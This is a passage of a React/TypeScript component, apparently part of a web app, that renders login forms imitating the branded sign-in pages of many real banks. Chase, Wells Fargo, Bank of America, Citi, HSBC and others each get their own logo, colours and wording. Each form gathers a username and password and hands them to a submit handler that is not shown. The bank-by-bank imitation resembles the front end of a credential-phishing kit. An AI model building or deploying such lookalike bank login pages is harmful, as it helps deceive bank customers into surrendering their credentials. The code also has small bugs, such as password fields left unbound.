import {
  Building,
  Eye,
  EyeOff,
  X,
  Lock,
  Info,
  MessageCircle,
  Phone,
  MapPin,
} from 'lucide-react';
import { Dispatch, SetStateAction, useState } from 'react';

interface BankLoginProps {
  selectedBank: string;
  handleLoginSubmit: (e: React.FormEvent) => void;
  bankLoginData: any;
  handleBankLoginChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  showPassword: boolean;
  setShowPassword: Dispatch<SetStateAction<boolean>>;
  banks: any[];
}

const BankLoginForm: React.FC<BankLoginProps> = ({
  banks,
  selectedBank,
  handleLoginSubmit,
  showPassword,
  setShowPassword,
  bankLoginData,
  handleBankLoginChange,
}: BankLoginProps) => {
  const [saveUsername, setSaveUsername] = useState(false);
  const bankData = banks.find((bnk) => bnk.name === selectedBank);
  // Get bank-specific styling
  const getBankStyling = (bankName: string) => {
    switch (bankName) {
      case 'Wells Fargo':
        return {
          bgColor: 'bg-gray-50',
          primaryColor: 'text-gray-800',
          buttonColor: 'bg-gray-300 hover:bg-gray-400 text-gray-800',
          inputBorder: 'border-gray-300 focus:border-gray-500',
          greeting: 'Good morning',
          showLogo: false,
        };
      case 'Bank of America':
        return {
          bgColor: 'bg-blue-50',
          primaryColor: 'text-blue-900',
          buttonColor: 'bg-blue-600 hover:bg-blue-700 text-white',
          inputBorder: 'border-blue-300 focus:border-blue-500',
          greeting: 'Welcome back',
          showLogo: true,
        };
      case 'Chase':
        return {
          bgColor: 'bg-blue-900',
          primaryColor: 'text-white',
          buttonColor: 'bg-blue-600 hover:bg-blue-500 text-white',
          inputBorder:
            'border-blue-400 focus:border-blue-300 bg-white text-gray-900',
          greeting: 'Sign in to Chase',
          showLogo: true,
        };
      case 'TD Bank':
        return {
          bgColor: 'bg-green-50',
          primaryColor: 'text-green-900',
          buttonColor: 'bg-green-600 hover:bg-green-700 text-white',
          inputBorder: 'border-green-300 focus:border-green-500',
          greeting: 'Welcome to TD Bank',
          showLogo: true,
        };
      case 'Capital One':
        return {
          bgColor: 'bg-red-50',
          primaryColor: 'text-red-900',
          buttonColor: 'bg-red-600 hover:bg-red-700 text-white',
          inputBorder: 'border-red-300 focus:border-red-500',
          greeting: 'Sign in to Capital One',
          showLogo: true,
        };
      default:
        return {
          bgColor: 'bg-white',
          primaryColor: 'text-gray-800',
          buttonColor: 'bg-blue-600 hover:bg-blue-700 text-white',
          inputBorder: 'border-gray-300 focus:border-blue-500',
          greeting: 'Welcome',
          showLogo: true,
        };
    }
  };

  const styling = getBankStyling(selectedBank);

  const designForBanksLogin = () => {
    if (selectedBank === 'Wells Fargo') {
      return (
        <div className={`${styling.bgColor} rounded-lg`}>
          <div className="bg-[#D61F28] w-full h-16 rounded-t-lg border-b-4 border-[#FFCD41] flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[30px]"
            />
          </div>

          <div className=" p-8">
            <div className="text-center mb-8">
              <h2
                className={`text-3xl font-light ${styling.primaryColor} mb-8`}
              >
                {styling.greeting}
              </h2>
            </div>

            <form
              onSubmit={handleLoginSubmit}
              className="space-y-6 max-w-md mx-auto"
            >
              <div className="relative">
                <input
                  type="text"
                  name="username"
                  value={bankLoginData.username}
                  onChange={handleBankLoginChange}
                  placeholder="Username"
                  className="w-full px-6 py-4 border-2 border-gray-300 rounded-full text-lg placeholder-gray-500 focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-200 transition-all duration-200"
                  required
                />
                <button
                  type="button"
                  className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              <div className="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  name="password"
                  value={bankLoginData.password}
                  onChange={handleBankLoginChange}
                  placeholder="Password"
                  className="w-full px-6 py-4 border-2 border-gray-300 rounded-full text-lg placeholder-gray-500 focus:outline-none focus:border-purple-500 focus:ring-4 focus:ring-purple-200 transition-all duration-200"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 transform -translate-y-1/2 text-blue-600 hover:text-blue-800 font-medium underline"
                >
                  {showPassword ? 'Hide' : 'Show'}
                </button>
              </div>

              <div className="flex items-start space-x-3 mt-6">
                <input
                  type="checkbox"
                  id="saveUsername"
                  checked={saveUsername}
                  onChange={(e) => setSaveUsername(e.target.checked)}
                  className="mt-1 w-4 h-4 border-2 border-gray-400 rounded"
                />
                <div>
                  <label
                    htmlFor="saveUsername"
                    className={`${styling.primaryColor} font-medium`}
                  >
                    Save username
                  </label>
                  <p className="text-gray-600 text-sm mt-1">
                    To help keep your account secure, save your username only on
                    devices that aren't used by other people.
                  </p>
                </div>
              </div>

              <button
                type="submit"
                className={`w-full ${styling.buttonColor} font-medium py-4 px-6 rounded-full text-lg transition-all duration-300 mt-8`}
              >
                Sign on
              </button>
            </form>
          </div>
        </div>
      );
    } else if (selectedBank === 'Bank of America') {
      return (
        <div className={`bg-white rounded-lg`}>
          <div className="w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[300px] h-[40px]"
            />
          </div>

          <div className=" p-8">
            <div className="text-center mb-8"></div>

            <div className="bg-gray-50 flex items-center justify-center p-4">
              <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm">
                <form onSubmit={handleLoginSubmit} className="space-y-6">
                  {/* User ID Section */}
                  <div>
                    <label
                      htmlFor="userId"
                      className="block text-lg font-normal text-gray-800 mb-3"
                    >
                      User ID
                    </label>
                    <input
                      type="text"
                      id="userId"
                      name="username"
                      value={bankLoginData.username}
                      onChange={handleBankLoginChange}
                      className="w-full px-4 py-1 border border-gray-300 rounded-sm text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />

                    {/* Save User ID Checkbox */}
                    <div className="flex items-center mt-4 space-x-2">
                      <input
                        type="checkbox"
                        id="saveUserId"
                        name="saveUserId"
                        className="w-4 h-4 border-2 border-gray-400 rounded-sm focus:ring-blue-500"
                      />
                      <label
                        htmlFor="saveUserId"
                        className="text-base text-gray-700"
                      >
                        Save this User ID
                      </label>
                      <Info className="w-5 h-5 text-blue-500 cursor-help" />
                    </div>
                  </div>

                  {/* Password Section */}
                  <div className="pt-4">
                    <label
                      htmlFor="password"
                      className="block text-lg font-normal text-gray-800 mb-3"
                    >
                      Password
                    </label>
                    <input
                      type="password"
                      id="password"
                      name="password"
                      value={bankLoginData.password}
                      onChange={handleBankLoginChange}
                      onClick={() => setShowPassword(!showPassword)}
                      className="w-full px-4 py-1 border border-gray-300 rounded-sm text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />

                    {/* Forgot Password Link */}
                    <div className="mt-4">
                      <a
                        href="#"
                        className="text-blue-600 hover:text-blue-800 text-base underline"
                      >
                        Forgot your Password?
                      </a>
                    </div>
                  </div>

                  {/* Log In Button */}
                  <div className="pt-6">
                    <button
                      type="submit"
                      className="bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium px-4 py-1 rounded-lg transition-colors duration-200 flex items-center space-x-2"
                    >
                      <Lock className="w-4 h-4" />
                      <span>Log In</span>
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'Discover Bank') {
      return (
        <div className={`bg-white rounded-lg`}>
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex justify-center">
            <img
              src={bankData?.additionalLogo}
              className="pt-5 pl-5 w-[200px] "
            />
          </div>

          <div className=" p-8">
            <div className="text-center"></div>

            <div className="bg-gray-50 flex items-center justify-center p-4">
              <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm">
                <div className="flex gap-1 my-2">
                  <Lock className="w-6 h-6" />
                  <span className="text-xl text-[#23233F] font-bold font-serif">
                    Secure Account Login
                  </span>
                </div>
                <form onSubmit={handleLoginSubmit} className="space-y-4">
                  <div>
                    <input
                      type="text"
                      id="userId"
                      name="username"
                      placeholder="User"
                      value={bankLoginData.username}
                      onChange={handleBankLoginChange}
                      className="w-full px-4 py-3 border border-gray-300 rounded-xl text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />
                  </div>

                  {/* Password Section */}
                  <div className="">
                    <input
                      type="password"
                      id="password"
                      name="password"
                      placeholder="Password"
                      onClick={() => setShowPassword(!showPassword)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-xl text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />
                  </div>

                  {/* Log In Button */}
                  <div className="pt-6">
                    <button
                      type="submit"
                      className="bg-[#EA6928] flex justify-center text-white text-center text-lg w-full font-medium px-4 py-1 rounded-lg transition-colors duration-200 flex items-center space-x-2 text-center"
                    >
                      <Lock className="w-4 h-4" />
                      <span className="font-serif">Log In</span>
                    </button>
                    <div className="mt-4 flex gap-1">
                      <Lock className="w-4 h-4 mt-1" />
                      <a
                        href="#"
                        className="text-blue-600 hover:text-blue-800 text-base"
                      >
                        Forgot User ID/Password
                      </a>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'Fifth Third Bank') {
      return (
        <div className={`bg-white rounded-lg`}>
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[250px] h-[60px]"
            />
          </div>

          <div className="p-8">
            <div className="text-center mb-8"></div>

            <div className="bg-gray-50 flex items-center justify-center p-4">
              <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm">
                <div className="flex gap-1 my-2">
                  <span className="text-2xl text-[#23233F] font-bold">
                    Online Banking Login
                  </span>
                </div>
                <form onSubmit={handleLoginSubmit} className="space-y-2">
                  {/* User ID Section */}
                  <div>
                    <label
                      htmlFor="userId"
                      className="block text-lg font-bold text-gray-800 mb-1"
                    >
                      User ID
                    </label>
                    <input
                      type="text"
                      id="userId"
                      name="username"
                      value={bankLoginData.username}
                      onChange={handleBankLoginChange}
                      className="w-full px-4 py-2 border border-gray-300 rounded-sm text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />
                  </div>

                  {/* Password Section */}
                  <div className="pt-0">
                    <label
                      htmlFor="password"
                      className="block text-lg font-bold text-gray-800 mb-1"
                    >
                      Password
                    </label>
                    <input
                      type="password"
                      value={bankLoginData.password}
                      onChange={handleBankLoginChange}
                      id="password"
                      name="password"
                      onClick={() => setShowPassword(!showPassword)}
                      className="w-full px-4 py-1 border border-gray-300 rounded-sm text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />

                    {/* Forgot Password Link */}
                  </div>

                  {/* Log In Button */}
                  <div className="pt-2">
                    <button
                      type="submit"
                      className="bg-[#1D4094] flex justify-center  hover:bg-blue-700 text-white text-sm w-full px-4 py-1 rounded-sm transition-colors duration-200 flex items-center space-x-2"
                    >
                      <span className="text-lg text-center">LOG IN</span>
                    </button>
                  </div>
                  <div className="mt-4">
                    <a
                      href="#"
                      className="text-blue-600 hover:text-blue-800 text-base underline"
                    >
                      Forgot your Password?
                    </a>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'Chase') {
      return (
        <div className={`bg-white rounded-lg`}>
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[40px]"
            />
          </div>

          <div className="p-8">
            <div className="text-center mb-8"></div>

            <div className="bg-gray-50 flex items-center justify-center p-4">
              <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm">
                <form onSubmit={handleLoginSubmit} className="space-y-6">
                  {/* User ID Section */}
                  <div>
                    <div className="relative group">
                      <label
                        htmlFor="userId"
                        className="absolute left-0 -top-2 text-gray-500 text-base transition-all duration-300 ease-in-out group-focus-within:top-0 group-focus-within:text-xs group-focus-within:text-blue-600"
                      >
                        Username
                      </label>
                      <input
                        type="text"
                        id="userId"
                        name="username"
                        value={bankLoginData.username}
                        onChange={handleBankLoginChange}
                        required
                        className="w-full px-0.5 py-2 border-b-2 border-gray-300 focus:outline-none focus:border-blue-600 peer"
                      />
                    </div>
                  </div>

                  {/* Password Section */}
                  <div className="pt-0">
                    <div className="relative group">
                      <label
                        htmlFor="password"
                        className="absolute left-0 -top-2 text-gray-500 text-base transition-all duration-300 ease-in-out group-focus-within:top-0 group-focus-within:text-xs group-focus-within:text-blue-600"
                      >
                        Password
                      </label>
                      <input
                        type="password"
                        id="password"
                        name="password"
                        onClick={() => setShowPassword(!showPassword)}
                        required
                        className="w-full px-0.5 py-2 border-b-2 border-gray-300 focus:outline-none focus:border-blue-600 peer"
                      />
                    </div>
                  </div>

                  {/* Log In Button */}
                  <div className="pt-2">
                    <button
                      type="submit"
                      className="bg-[#035FEF] flex justify-center  hover:bg-blue-700 text-white text-sm w-full px-4 py-1 rounded-sm transition-colors duration-200 flex items-center space-x-2"
                    >
                      <span className="text-base text-center">SIGN IN</span>
                    </button>
                  </div>
                  <div className="mt-4">
                    <a
                      href="#"
                      className="text-blue-500 hover:text-blue-800 text-base underline"
                    >
                      Forgot your Username/Password?
                    </a>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'Citi') {
      return (
        <div className={`bg-white rounded-lg`}>
          <div className="w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[100px] h-[80px]"
            />
          </div>

          <div className="py-4">
            <div className="text-center mb-8"></div>

            <div className="bg-gray-50 flex items-center justify-center">
              <div className="w-full max-w-md bg-white p-4 rounded-lg shadow-sm">
                <form onSubmit={handleLoginSubmit} className="max-w-md mx-auto">
                  <div className="flex gap-2">
                    <div className="relative">
                      <label
                        htmlFor="username"
                        className="block text-base font-semibold text-gray-800 mb-1 font-serif"
                      >
                        User ID
                      </label>
                      <input
                        type="text"
                        name="username"
                        value={bankLoginData.username}
                        onChange={handleBankLoginChange}
                        placeholder="User ID"
                        className="w-full font-serif italic px-2 py-2 border border-black rounded-lg text-lg placeholder-gray-500 focus:outline focus:ring-2 focus:ring-black transition-all duration-200"
                        required
                      />
                    </div>

                    <div className="relative">
                      <label
                        htmlFor="password"
                        className="block text-base font-semibold text-gray-800 mb-1 font-serif"
                      >
                        Password
                      </label>
                      <input
                        type={showPassword ? 'text' : 'password'}
                        name="password"
                        value={bankLoginData.password}
                        onChange={handleBankLoginChange}
                        placeholder="Password"
                        className="w-full font-serif italic px-2 py-2 border border-black rounded-lg text-lg placeholder-gray-500 focus:outline focus:ring-2 focus:ring-black transition-all duration-200"
                        required
                      />
                    </div>
                  </div>

                  <div className="flex items-start space-x-3 mt-2">
                    <input
                      type="checkbox"
                      id="saveUsername"
                      checked={saveUsername}
                      onChange={(e) => setSaveUsername(e.target.checked)}
                      className="mt-1 w-4 h-4 border-2 border-gray-400 rounded"
                    />
                    <div>
                      <label
                        htmlFor="saveUsername"
                        className={`${styling.primaryColor} font-normal text-sm`}
                      >
                        Remember User ID
                      </label>
                    </div>
                  </div>

                  <button
                    type="submit"
                    className={`w-full mt-8 bg-[#056CAE] font-serif text-white font-normal py-2 px-4 rounded-lg text-lg transition-all duration-300 mt-8`}
                  >
                    Sign on
                  </button>
                  <div className="mt-4">
                    <a
                      href="#"
                      className="text-blue-800 hover:text-blue-800 text-base underline"
                    >
                      Forgot User ID?
                    </a>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'Truist') {
      return (
        <div className={`bg-[#2E1A46] rounded-lg`}>
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[140px] h-[50px]"
            />
          </div>

          <div className=" p-8">
            <div className="text-center mb-8"></div>

            <div className="bg-[#2E1A46] flex items-center justify-center p-4">
              <div className="w-full max-w-md bg-[#2E1A46] p-8 rounded-lg shadow-sm">
                <form onSubmit={handleLoginSubmit} className="space-y-3">
                  {/* User ID Section */}
                  <div>
                    <input
                      type="text"
                      id="userId"
                      name="username"
                      value={bankLoginData.username}
                      onChange={handleBankLoginChange}
                      placeholder="User ID"
                      className="w-full px-4 .placeholder-black::placeholder py-1 border border-gray-300 rounded-sm text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />

                    {/* Save User ID Checkbox */}
                    <div className="flex mt-2 justify-between">
                      <div className="flex space-x-2">
                        <input
                          type="checkbox"
                          id="saveUserId"
                          name="saveUserId"
                          className="form-checkbox checked:bg-white text-white bg-transparent border-gray-300 rounded w-5 h-5"
                        />
                        <label
                          htmlFor="saveUserId"
                          className="text-base text-white"
                        >
                          Save User ID
                        </label>
                      </div>
                      <div>
                        <a
                          href="#"
                          className="text-[#A6A3E0] text-base underline"
                        >
                          Forgot User ID?
                        </a>
                      </div>
                    </div>
                  </div>

                  {/* Password Section */}
                  <div className="pt-4">
                    <input
                      type="password"
                      id="password"
                      name="password"
                      placeholder="Password"
                      onClick={() => setShowPassword(!showPassword)}
                      className="w-full px-4 placeholder-black::placeholder py-1 border border-gray-300 rounded-sm text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />

                    {/* Forgot Password Link */}
                    <div className="mt-2 flex justify-end">
                      <a
                        href="#"
                        className="text-[#A6A3E0] text-base underline"
                      >
                        Reset Password?
                      </a>
                    </div>
                  </div>

                  {/* Log In Button */}
                  <div className="pt-6">
                    <button
                      type="submit"
                      className="bg-[#A5A3DF] flex justify-center w-full hover:bg-[#A5A3DF] text-white text-sm font-medium px-4 py-3 rounded-full transition-colors duration-200 flex items-center space-x-2"
                    >
                      <span className="text-[#2E1A47] text-xl">Sign In</span>
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'US Bank') {
      return (
        <div className={`bg-white rounded-lg`}>
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[60px]"
            />
          </div>

          <div className=" p-8">
            <div className="text-center mb-8"></div>

            <div className="bg-white flex items-center justify-center p-4">
              <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm">
                <div>
                  <span className="text-xl font-medium font-sans">Sign In</span>
                </div>
                <form onSubmit={handleLoginSubmit} className="space-y-6">
                  {/* User ID Section */}
                  <div>
                    <div className="relative group">
                      <label
                        htmlFor="userId"
                        className="absolute left-0 -top-2 text-black text-base transition-all duration-300 ease-in-out group-focus-within:top-0 group-focus-within:text-xs group-focus-within:text-blue-600"
                      >
                        Username
                      </label>
                      <input
                        type="text"
                        id="userId"
                        name="username"
                        value={bankLoginData.username}
                        onChange={handleBankLoginChange}
                        required
                        className="w-full px-0.5 py-2 border-b-2 border-gray-300 focus:outline-none focus:border-blue-600 peer"
                      />
                    </div>
                  </div>

                  {/* Password Section */}
                  <div className="pt-0">
                    <div className="relative group">
                      <label
                        htmlFor="password"
                        className="absolute left-0 -top-2 text-black text-base transition-all duration-300 ease-in-out group-focus-within:top-0 group-focus-within:text-xs group-focus-within:text-blue-600"
                      >
                        Password
                      </label>
                      <input
                        type="password"
                        id="password"
                        name="password"
                        onClick={() => setShowPassword(!showPassword)}
                        required
                        className="w-full px-0.5 py-2 border-b-2 border-gray-300 focus:outline-none focus:border-blue-600 peer"
                      />
                    </div>
                  </div>

                  {/* Log In Button */}
                  <div className="pt-2">
                    <button
                      type="submit"
                      className="bg-[#035FEF] rounded-lg flex justify-center  hover:bg-blue-700 text-white text-sm w-full px-4 py-3 transition-colors duration-200 flex items-center space-x-2"
                    >
                      <span className="text-base text-center font-semibold">
                        Log In
                      </span>
                    </button>
                  </div>
                  <div className="mt-4">
                    <a
                      href="#"
                      className="text-[#235AE4] font-medium hover:text-blue-800 text-base underline"
                    >
                      Forgot your Username/Password?
                    </a>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'Capital One') {
      return (
        <div className={`bg-white rounded-lg`}>
          <div className="bg-white w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[150px] h-[80px]"
            />
          </div>

          <div className=" p-8">
            <div className="text-center mb-8"></div>

            <div className="bg-white flex items-center justify-center p-4">
              <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm">
                <form onSubmit={handleLoginSubmit} className="space-y-4">
                  <div>
                    <label
                      htmlFor="username"
                      className="block text-sm font-semibold text-gray-800 mb-1 font-sans"
                    >
                      Username
                    </label>
                    <input
                      type="text"
                      id="userId"
                      name="username"
                      placeholder="User"
                      value={bankLoginData.username}
                      onChange={handleBankLoginChange}
                      className="w-full px-4 py-3 border border-gray-300 rounded-xl text-base focus:outline-none focus:ring-2 focus:ring-[#0070A8] focus:border-transparent"
                      required
                    />
                  </div>

                  {/* Password Section */}
                  <div className="">
                    <label
                      htmlFor="passowrd"
                      className="block text-sm font-semibold text-gray-800 mb-1 font-sans"
                    >
                      Password
                    </label>
                    <input
                      type="password"
                      id="password"
                      name="password"
                      placeholder="Password"
                      onClick={() => setShowPassword(!showPassword)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-xl text-base focus:outline-none focus:ring-2 focus:ring-[#0070A8] focus:border-transparent"
                      required
                    />
                  </div>

                  {/* Log In Button */}
                  <div className="pt-6">
                    <button
                      type="submit"
                      className="bg-[#0070A8] flex justify-center text-white text-center text-lg w-full font-medium px-4 py-2 rounded-lg transition-colors duration-200 flex items-center space-x-2 text-center"
                    >
                      <span className="font-serif">Sign in</span>
                    </button>
                    <div className="mt-4 flex gap-1">
                      <a
                        href="#"
                        className="text-[#0070A8] hover:text-blue-800 text-base text-semibold"
                      >
                        Forgot User ID/Password
                      </a>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'Regions Bank') {
      return (
        <div className={`bg-white rounded-lg`}>
          <div className="bg-white w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[40px]"
            />
          </div>

          <div className="px-8 pt-0 pb-8">
            <div className="text-center"></div>
            <div className="flex items-start gap-1 mt-1">
              <img src="/bank-logos/fdicLogo.27bc4719.svg" className="mt-1" />
              <span className="font-semibold text-sm">
                FDIC-Insured - Backed by the full faith and credit of the U.S.
                Government
              </span>
            </div>
            <div className="bg-white flex items-center justify-center p-4">
              <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm">
                <form onSubmit={handleLoginSubmit} className="space-y-4">
                  <div>
                    <label
                      htmlFor="username"
                      className="block text-sm font-semibold text-gray-800 mb-1 font-sans"
                    >
                      Username
                    </label>
                    <input
                      type="text"
                      id="userId"
                      name="username"
                      placeholder="User"
                      value={bankLoginData.username}
                      onChange={handleBankLoginChange}
                      className="w-full px-4 py-3 border border-gray-300 rounded-xl text-base hover:border-[#5e9c11] focus:outline-none focus:ring-4 focus:ring-[#360] focus:border-transparent"
                      required
                    />
                  </div>

                  {/* Password Section */}
                  <div className="">
                    <label
                      htmlFor="passowrd"
                      className="block text-sm font-semibold text-gray-800 mb-1 font-sans"
                    >
                      Password
                    </label>
                    <input
                      type="password"
                      id="password"
                      name="password"
                      placeholder="Password"
                      onClick={() => setShowPassword(!showPassword)}
                      className="w-full px-4 py-3 hover:border-[#5e9c11] border border-gray-300 rounded-xl text-base focus:outline-none focus:ring-4 focus:ring-[#360] focus:border-transparent"
                      required
                    />
                  </div>

                  {/* Log In Button */}
                  <div className="pt-6">
                    <button
                      type="submit"
                      className="bg-[#417514] flex justify-center text-white text-center text-lg w-full font-medium px-4 py-2 rounded-lg transition-colors duration-200 flex items-center space-x-2 text-center"
                    >
                      <span className="font-serif">Continue</span>
                    </button>
                    <div className="mt-4 flex gap-1">
                      <a
                        href="#"
                        className="text-black hover:text-gray-800 text-base text-semibold underline"
                      >
                        Forgot User ID/Password
                      </a>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'KeyBank') {
      return (
        <div className={`bg-white rounded-lg`}>
          <div className="w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[350px] h-[40px]"
            />
          </div>

          <div className=" p-8">
            <div className="text-center mb-8"></div>

            <div className="bg-white flex items-center justify-center p-4">
              <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm">
                <div className="flex justify-center mb-10">
                  <img src={'/bank-logos/key-logo.svg'} />
                </div>
                <form onSubmit={handleLoginSubmit} className="space-y-4">
                  <div>
                    <label
                      htmlFor="username"
                      className="block text-sm font-semibold text-gray-800 mb-1 font-sans"
                    >
                      Enter your User ID
                    </label>
                    <input
                      type="text"
                      id="userId"
                      name="username"
                      placeholder="User"
                      value={bankLoginData.username}
                      onChange={handleBankLoginChange}
                      className="w-full px-4 py-3 border border-gray-300 rounded-sm text-base hover:border-[#5e9c11] focus:outline-none focus:ring-2 focus:ring-[#2297BF] focus:border-transparent"
                      required
                    />
                    <div className="flex items-center mt-4 space-x-2">
                      <input
                        type="checkbox"
                        id="saveUserId"
                        name="saveUserId"
                        className="w-4 h-4 border-2 border-gray-400 rounded-sm focus:ring-blue-500"
                      />
                      <label
                        htmlFor="saveUserId"
                        className="text-sm text-gray-700"
                      >
                        Save this User ID
                      </label>
                    </div>
                  </div>

                  {/* Password Section */}
                  <div className="">
                    <label
                      htmlFor="passowrd"
                      className="block text-sm font-semibold text-gray-800 mb-1 font-sans"
                    >
                      Enter your Password
                    </label>
                    <input
                      type="password"
                      id="password"
                      name="password"
                      placeholder="Password"
                      onClick={() => setShowPassword(!showPassword)}
                      className="w-full px-4 py-3 hover:border-[#5e9c11] border border-gray-300 rounded-sm text-base focus:outline-none focus:ring-2 focus:ring-[#2297BF] focus:border-transparent"
                      required
                    />
                  </div>

                  {/* Log In Button */}
                  <div className="pt-6">
                    <button
                      type="submit"
                      className="bg-[#CC0100] flex justify-center text-white text-center text-lg w-full font-medium px-4 py-2 rounded-lg transition-colors duration-200 flex items-center space-x-2 text-center"
                    >
                      <span className="font-serif">Sign On</span>
                    </button>
                    <div className="mt-4 flex gap-1">
                      <a
                        href="#"
                        className="text-black hover:text-gray-800 text-base text-semibold underline"
                      >
                        Forgot User ID/Password
                      </a>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'HSBC') {
      return (
        <div className={`bg-white rounded-lg`}>
          <div className="bg-[#CC0100] w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[40px]"
            />
          </div>

          <div className=" p-8">
            <div className="text-center mb-8"></div>

            <div className="bg-white flex items-center justify-center p-4">
              <div className="w-full max-w-md bg-white p-8 rounded-lg shadow-sm">
                <form onSubmit={handleLoginSubmit} className="space-y-4">
                  <div>
                    <label
                      htmlFor="username"
                      className="block text-sm font-semibold text-gray-800 mb-1 font-sans"
                    >
                      Enter your Username
                    </label>
                    <input
                      type="text"
                      id="userId"
                      name="username"
                      placeholder="username"
                      value={bankLoginData.username}
                      onChange={handleBankLoginChange}
                      className="w-full px-4 py-3 border border-gray-300 rounded-sm text-base hover:border-[#5e9c11] focus:outline-none focus:ring-2 focus:ring-[#2297BF] focus:border-transparent"
                      required
                    />
                    <div className="flex items-center mt-4 space-x-2">
                      <input
                        type="checkbox"
                        id="saveUserId"
                        name="saveUserId"
                        className="w-4 h-4 border-2 border-gray-400 rounded-sm focus:ring-blue-500"
                      />
                      <label
                        htmlFor="saveUserId"
                        className="text-sm text-gray-700"
                      >
                        Remember Me
                      </label>
                    </div>
                  </div>

                  {/* Password Section */}
                  <div className="">
                    <label
                      htmlFor="passowrd"
                      className="block text-sm font-semibold text-gray-800 mb-1 font-sans"
                    >
                      Enter your Password
                    </label>
                    <input
                      type="password"
                      id="password"
                      name="password"
                      placeholder="Password"
                      onClick={() => setShowPassword(!showPassword)}
                      className="w-full px-4 py-3 hover:border-[#5e9c11] border border-gray-300 rounded-sm text-base focus:outline-none focus:ring-2 focus:ring-[#2297BF] focus:border-transparent"
                      required
                    />
                  </div>

                  {/* Log In Button */}
                  <div className="pt-6">
                    <button
                      type="submit"
                      className="bg-[#CC0100] flex justify-center text-white text-center text-lg w-full font-medium px-4 py-2 rounded-sm transition-colors duration-200 flex items-center space-x-2 text-center"
                    >
                      <span className="font-serif">Continue</span>
                    </button>
                    <div className="mt-4 flex gap-1">
                      <a
                        href="#"
                        className="text-black hover:text-gray-800 text-base text-semibold underline"
                      >
                        Forgot User ID/Password
                      </a>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'PNC') {
      return (
        <div className="bg-white rounded-lg">
          <div className="bg-[#414e58] w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[40px]"
              alt="PNC Bank Logo"
            />
          </div>

          <div className="p-8">
            <form onSubmit={handleLoginSubmit} className="max-w-2xl mx-auto">
              <div className="flex flex-col md:flex-row md:space-x-6">
                {/* User ID */}
                <div className="flex-1 mb-4 md:mb-0">
                  <label
                    htmlFor="userId"
                    className="block text-sm font-semibold text-gray-700 mb-1"
                  >
                    User ID{' '}
                    <span className="text-xs text-gray-500">(required)</span>
                  </label>
                  <input
                    type="text"
                    id="userId"
                    name="username"
                    placeholder="Enter User ID"
                    value={bankLoginData.username}
                    onChange={handleBankLoginChange}
